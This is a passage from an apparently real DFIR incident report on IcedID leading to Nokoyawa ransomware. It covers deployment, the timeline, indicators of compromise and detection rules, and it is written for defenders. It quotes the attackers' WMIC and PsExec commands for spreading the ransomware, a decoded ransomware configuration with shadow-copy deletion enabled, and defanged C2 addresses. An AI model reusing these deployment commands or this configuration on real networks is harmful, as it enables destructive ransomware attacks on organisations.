<p>The threat actors opened the document from the IP:</p>
<pre class="wp-block-preformatted">45.61.139.126
</pre>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-045.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18597" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-045.png" alt width="631" height="148" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-045.png 631w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-045-300x70.png 300w" sizes="(max-width: 631px) 100vw, 631px" /></a></figure>
<p>&nbsp;</p>
<h2 id="impact" class="wp-block-heading"><a href="#impact">Impact</a></h2>
<p>Threat Actors deployed Nokoyawa ransomware from one of the servers using WMI and PsExec. They first copied the ransomware binary,k.exe, and a batch script p.bat using WMI:</p>
<pre class="wp-block-preformatted">wmic /node:"TARGET_HOST_IP" /user:"DOMAIN\USER" /password:"PASSWORD" process call create "cmd.exe /c copy \\SOURCE_SERVER_IP\c$\windows\temp\p.bat c:\windows\temp\"
</pre>
<p>Command spawned by WmiPrvSE.exe:</p>
<pre class="wp-block-preformatted">cmd.exe /c copy \\SOURCE_SERVER_IP\c$\windows\temp\k.exe c:\windows\temp\
</pre>
<p>A snippet of SMB network traffic generated by the above command:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-046.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18598" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-046.png" alt width="1069" height="229" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-046.png 1069w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-046-300x64.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-046-1024x219.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-046-768x165.png 768w" sizes="(max-width: 1069px) 100vw, 1069px" /></a></p>
<p>The p.bat is a simple batch script that runs the k.exe binary with a Base64 encoded configuration:</p>
<pre class="wp-block-preformatted">c:\windows\temp\k.exe --config REDACTED
</pre>
<p>The redacted parameter used by the `&#8211;config` flag decodes to:</p>
<pre class="wp-block-preformatted">{"EXTENSION": "AWAYOKON", "NOTE_NAME": "AWAYOKON-readme.txt", "NOTE_CONTENT": "REDACTED", "ECC_PUBLIC": "lHrYQm+P3IbmyjTop2FK0qUdwOcSgHuFiT+r77bT4w0=", "SKIP_DIRS": ["windows", "program files", "program files (x86)", "appdata", "programdata", "system volume information", ""], "SKIP_EXTS": [".exe", ".dll", ".ini", ".lnk", ".url", ""], "ENCRYPT_NETWORK": true, "LOAD_HIDDEN_DRIVES": true, "DELETE_SHADOW": true}
</pre>
<p>The decoded configuration file shows the ransomware extension, the note name, and the note content encoded in Base64. The threat actors also configured a number of directories and extensions to skip, and enabled network and hidden drives encryption. The DELETE_SHADOW was set to true, in order to delete volume shadow copies.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-047.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18599" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-047.png" alt width="736" height="187" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-047.png 736w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-047-300x76.png 300w" sizes="(max-width: 736px) 100vw, 736px" /></a></p>
<p>Based on the configuration parameters being passed via command line and the code written in C++, the deployment appears to be part of the <a href="https://www.zscaler.com/blogs/security-research/nevada-ransomware-yet-another-nokoyawa-variant" target="_blank" rel="noreferrer noopener">1.1 version of the Nokoyawa</a> code base:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-048.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18600" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-048.png" alt width="851" height="624" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-048.png 851w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-048-300x220.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-048-768x563.png 768w" sizes="(max-width: 851px) 100vw, 851px" /></a></p>
<p>Ransomware sample code signature:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-049.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18601" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-049.png" alt width="1010" height="516" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-049.png 1010w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-049-300x153.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-049-768x392.png 768w" sizes="(max-width: 1010px) 100vw, 1010px" /></a></p>
<p>Debug information shows that the binary was generated a few hours before the encryption:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-050.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18602" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-050.png" alt width="908" height="563" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-050.png 908w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-050-300x186.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-050-768x476.png 768w" sizes="(max-width: 908px) 100vw, 908px" /></a></p>
<p>The ransomware was then deployed at scale using PsExec to encrypt the Windows domain:</p>
<pre class="wp-block-preformatted">psexec.exe  \\TARGET_HOST_IP -u DOMAIN\USER -p "PASSWORD" -s -d -h -r mstdc -accepteula -nobanner c:\windows\temp\p.bat
</pre>
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-051.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18603" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-051.png" alt width="1600" height="334" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-051.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-051-300x63.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-051-1024x214.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-051-768x160.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-051-1536x321.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></p>
<p>A ransom message was left in each directory where files were encrypted.</p>
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-052.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18604" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-052.png" alt width="1042" height="798" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-052.png 1042w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-052-300x230.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-052-1024x784.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-052-768x588.png 768w" sizes="(max-width: 1042px) 100vw, 1042px" /></a></p>
<p>After encryption, contact was made with the threat actors using their support site and the price of the ransom was quoted at ~$200,000 USD in Bitcoin. No ransom was paid as a result of this intrusion.</p>
<h2 id="timeline" class="wp-block-heading"><a href="#timeline">Timeline</a></h2>
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-053-3.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18640" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-053-3.png" alt width="2848" height="4960" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-053-3.png 2848w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-053-3-172x300.png 172w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-053-3-588x1024.png 588w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-053-3-768x1338.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-053-3-882x1536.png 882w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-053-3-1176x2048.png 1176w" sizes="(max-width: 2848px) 100vw, 2848px" /></a></p>
<h2 id="diamond-model" class="wp-block-heading"><a href="#diamond-model">Diamond Model</a></h2>
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-054-2.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18615" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-054-2.png" alt width="3698" height="1374" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-054-2.png 3698w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-054-2-300x111.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-054-2-1024x380.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-054-2-768x285.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-054-2-1536x571.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-054-2-2048x761.png 2048w" sizes="(max-width: 3698px) 100vw, 3698px" /></a></p>
<h2 id="iocs" class="wp-block-heading"><a href="#iocs">Indicators</a></h2>
<h3 class="wp-block-heading">Atomic</h3>
<pre class="wp-block-preformatted">Cobalt Strike
50.3.132[.]232:8081 / iconnectgs[.]com
5.8.18[.]242:443
23.29.115[.]152:757 / aicsoftware[.]com
23.29.115[.]152:8080 / aicsoftware[.]com

Powershell Cobalt Strike Downloader
https://aicsoftware[.]com:757/coin

IcedID Excel Download URL
https://simipimi[.]com

IcedID C2
kicknocisd[.]com
159.65.169[.]200
45.66.248[.]119:443 /  guaracheza[.]pics |  belliecow[.]wiki
198.244.180.66:443 /  curabiebarristie[.]com |  stayersa[.]art

BackConnect
137.74.104[.]108:8080 
</pre>
<h3 class="wp-block-heading">Computed</h3>
<pre class="wp-block-preformatted">1.bat
b5db398832461be8d93fdbda120088aa  
b36748a27b8e68710701286106ad434c9afea6fa  
30a334da51d22b2fe6e33970df8d0f81396394de9d3a3c224751aacb2202b0db  

1.dll
9740f2b8aeacc180d32fc79c46333178  
c599c32d6674c01d65bff6c7710e94b6d1f36869  
d3db55cd5677b176eb837a536b53ed8c5eabbfd68f64b88dd083dc9ce9ffb64e  

4_202210250456866742.xls
d3032968085db665381d9cbd3569f330  
9230520c6dd215e2152bb2e56b2a5d6b45ae8e13  
eb84a283ff58906786d63ffe43a8ff2728584428f5f7d9972c664f63f8790113  

7030270
964c94b217d102e53a227bcbc94ae52e  
b846e89d0f56851696d50b5e64c6e758ddae3e6a  
091886c95ca946aedee24b7c751b5067c5ac875923caba4d3cc9d961efadb65d

k.exe
40c9dc2897b6b348da88b23deb0d3952  
0f5457b123e60636623f585cc2bf2729f13a95d6  
7095beafff5837070a89407c1bf3c6acf8221ed786e0697f6c578d4c3de0efd6  

mstdc.exe
7dae150c1df0e01467be3a743775b646 
f309b61a8b005b5ce0a3fb58caaa798cfc95f5db  
3c19fee379b4882971834a3d38f3f8b86de560114274375560433778cd505748  

p.bat
385d21c0438f5b21920aa9eb894740d2  
5d2c17799dfc6717f89cd5f63951829aed038041  
e351ba5e50743215e8e99b5f260671ca8766886f69d84eabb83e99d55884bc2f  
</pre>
<h3 class="wp-block-heading"> </h3>
<h2 id="detections" class="wp-block-heading"><a href="#detections">Detections</a></h2>
<h3 class="wp-block-heading">Network</h3>
<pre class="wp-block-preformatted">ET MALWARE Win32/IcedID Request Cookie
ET POLICY OpenSSL Demo CA - Internet Widgits Pty (O)
NF - Malware IcedID BackConnect - Wait Command
NF - Malware IcedID BackConnect - Start VNC command - 11
ET MALWARE Meterpreter or Other Reverse Shell SSL Cert
ET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike
ET MALWARE Cobalt Strike Malleable C2 Profile (__session__id Cookie)
ET SCAN Behavioral Unusual Port 1433 traffic Potential Scan or Infection
ET POLICY SMB2 NT Create AndX Request For an Executable File
ET RPC DCERPC SVCCTL - Remote Service Control Manager Access
ET POLICY PsExec service created
ET POLICY SMB Executable File Transfer
ET POLICY SMB2 NT Create AndX Request For a .bat File
ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement
</pre>
<h3 class="wp-block-heading">Sigma</h3>
<p><a href="https://github.com/SigmaHQ/sigma" target="_blank" rel="noreferrer noopener">SIGMA Project Repo</a></p>
<p>New Process Created Via Wmic.EXE id: 526be59f-a573-4eea-b5f7-f0973207634d</p>
<p>Potential Recon Activity Via Nltest.EXE id: 5cc90652-4cbd-4241-aa3b-4b462fa5a248</p>
<p>Created Files by Office Applications id: c7a74c80-ba5a-486e-9974-ab9e682bc5e4</p>
<p>CobaltStrike Named Pipe id: d5601f8c-b26f-4ab0-9035-69e11a8d4ad2</p>
<p>Suspicious Group And Account Reconnaissance Activity Using Net.EXE id: d95de845-b83c-4a9a-8a6a-4fc802ebf6c0</p>
<p>PowerShell Download and Execution Cradles id: 85b0b087-eddf-4a2b-b033-d771fa2b9775</p>
<p>Meterpreter or Cobalt Strike Getsystem Service Installation &#8211; Security id: ecbc5e16-58e0-4521-9c60-eb9a7ea4ad34</p>
<p>Credential Dumping Tools Accessing LSASS Memory id: 32d0d3e2-e58d-4d41-926b-18b520b2b32d</p>
<p>Potential Defense Evasion Via Rename Of Highly Relevant Binaries id: 0ba1da6d-b6ce-4366-828c-18826c9de23e</p>
<p><a href="https://github.com/The-DFIR-Report/Sigma-Rules" target="_blank" rel="noreferrer noopener">DFIR Report Repo</a></p>
<p>AdFind Discovery id: 50046619-1037-49d7-91aa-54fc92923604</p>
<p>CHCP CodePage Locale Lookup id: dfbdd206-6cf2-4db9-93a6-0b7e14d5f02f</p>
<h3 class="wp-block-heading">Yara</h3>
<p><a href="https://github.com/The-DFIR-Report/Yara-Rules/blob/main/18190/18190.yar">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/18190/18190.yar</a></p>
<h3 id="mitre" class="wp-block-heading"><a href="#mitre">MITRE</a></h3>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-055-2.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18641" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-055-2.png" alt width="1246" height="2166" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-055-2.png 1246w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-055-2-173x300.png 173w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-055-2-589x1024.png 589w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-055-2-768x1335.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-055-2-884x1536.png 884w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-055-2-1178x2048.png 1178w" sizes="(max-width: 1246px) 100vw, 1246px" /></a></p>
<pre>Access Token Manipulation: Token Impersonation/Theft - T1134.001<br/>Account Discovery: Local Account - T1087.001<br/>Account Discovery: Domain Account - T1087.002<br/>Application Layer Protocol: Web Protocols - T1071.001<br/>Command and Scripting Interpreter: Windows Command Shell - T1059.003<br/>Command-Line Interface: PowerShell - T1059.001<br/>Command-Line Interface: Visual Basic - T1059.005<br/>Data Encrypted for Impact - T1486<br/>Domain Trust Discovery - T1482<br/>File and Directory Discovery - T1083<br/>Indicator Removal on Host: File Deletion - T1070.004<br/>Masquerading: Rename System Utilities - T1036.003<br/>Phishing: Spearphishing Attachment - T1566.001<br/>Process Injection – T1055<br/>Remote Services: RDP - T1021.001<br/>Remote Services: SMB/Windows Admin Shares - T1021.002<br/>Remote System Discovery - T1018<br/>Scheduled Task/Job: Scheduled Task - T1053.005<br/>System Binary Proxy Execution: Rundll32 - T1218.011<br/>System Network Configuration Discovery - T1016<br/>Valid Accounts - T1078<br/>WMI - T1047<br/>Unsecured Credentials: Credentials In Files - T1552.001<br/>User Execution: Malicious File - T1204.002<br/>Remote Services: Windows Remote Management - T1021.006<br/>Exfiltration Over C2 Channel - T1041<br/>Archive Collected Data: Archive via Utility - T1560.001<br/>Ingress Tool Transfer - T1105<br/>Web Service - T1102<br/>OS Credential Dumping: LSASS Memory - T1003.001<br/>Remote Access Software - T1219</pre>
<pre>AdFind - S0552<br/>IcedID - S0483<br/>ipconfig - S0100<br/>net - S0039<br/>nltest - S0359<br/>ping - S0097<br/>systeminfo - S0096<br/>cmd - S0106<br/>Cobalt Strike - S0154<br/>PsExec - S0029</pre>
<p>Internal case #18190</p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-18546" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/?share=twitter" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-18546" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/?share=linkedin" target="_blank" title="Click to share on LinkedIn"><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/?share=reddit" target="_blank" title="Click to share on Reddit"><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-18546" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/?share=facebook" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared class="share-jetpack-whatsapp sd-button share-icon" href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp"><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id="jp-relatedposts" class="jp-relatedposts">
<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
</div>
<footer class="entry-footer">
<div class="entry-meta">
</div>
</footer>
</div>
</article>
<nav class="navigation post-navigation" aria-label="Posts">
<h2 class="screen-reader-text">Post navigation</h2>
<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/" rel="prev">Malicious ISO File Leads to Domain Wide Ransomware</a></div><div class="nav-next"><a href="https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/" rel="next">A Truly Graceful Wipe Out</a></div></div>
</nav>
</main>
</div>
<aside id="secondary" class="widget-area">
<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
<label>
<span class="screen-reader-text">Search for:</span>
<input type="search" class="search-field" placeholder="Search &hellip;" value name="s" />
</label>
<input type="submit" class="search-submit" value="Search" />
</form></section><section id="google_translate_widget-5" class="widget widget_google_translate_widget"><div id="google_translate_element"></div></section><section id="block-7" class="widget widget_block"> <div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
<form action="https://wordpress.com/email-subscriptions" method="post" accept-charset="utf-8" data-blog="175340963" data-post_access_level="everybody" data-subscriber_email id="subscribe-blog">
<div class="wp-block-jetpack-subscriptions__form-elements">
<p id="subscribe-email">
<label id="subscribe-field-label" for="subscribe-field" class="screen-reader-text">
Type your email… </label>
<input required="required" type="email" name="email" class="no-border-radius " style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;" placeholder="Type your email…" value id="subscribe-field" title="Please fill in this field." /> </p>
<p id="subscribe-submit">
<input type="hidden" name="action" value="subscribe" />
<input type="hidden" name="blog_id" value="175340963" />
<input type="hidden" name="source" value="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/" />
<input type="hidden" name="sub-type" value="subscribe-block" />
<input type="hidden" name="app_source" value />
<input type="hidden" name="redirect_fragment" value="subscribe-blog" />
<input type="hidden" name="lang" value="en_US" />
<input type="hidden" id="_wpnonce" name="_wpnonce" value="2bedf18890" /><input type="hidden" name="_wp_http_referer" value="/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/" /><input type="hidden" name="post_id" value="18546" /> <button type="submit" class="wp-block-button__link no-border-radius" style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;" name="jetpack_subscriptions_widget">
Subscribe </button>
</p>
</div>
</form>
</div>
</div>
</section><section id="block-21" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png" alt class="wp-image-35571 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png 200w, https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h4 class="wp-block-heading"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc">Register For Our Next CTF</a></h4>
</div></div>
</section><section id="block-8" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png" alt class="wp-image-21332 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/" data-type="link" data-id="https://thedfirreport.com/">Reports</a></h3>
</div></div>
</section><section id="block-9" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/threat-intelligence/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png" alt class="wp-image-21334 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></h3>
</div></div>
</section><section id="block-10" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/detection-rules/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png" alt class="wp-image-21336 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></h3>
</div></div>
</section><section id="block-16" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/dfir-labs/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png" alt class="wp-image-31051 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png 200w, https://thedfirreport.com/wp-content/uploads/2024/04/labs-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a></h3>
</div></div>
</section><section id="block-12" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/mentoring-coaching-program/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png" alt class="wp-image-21333 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/help4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring and Coaching</a></h3>
</div></div>
</section></aside>
</div>
</div>
</div>
<footer id="colophon" class="site-footer" role="contentinfo">
<div class="copyright-area">
<div class="wrap">
<div class="site-info">
<a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Copyright 2023 | The DFIR Report | All Rights Reserved </div>
<div class="footer-right-info">
</div>
</div>
</div>
</footer>
<button href="#" class="back-to-top" type="button"><i class="fa-solid fa-arrow-up-long"></i>Go Top</button>
</div>
<script type="737edf8f76aca4389e1e0626-text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2023\/05\/22\/icedid-macro-ends-in-nokoyawa-ransomware\/":18546};
	</script>
<style id="jetpack-block-subscriptions-inline-css" type="text/css">
.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button[contenteditable=true],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button[contenteditable=true]{white-space:pre-wrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield 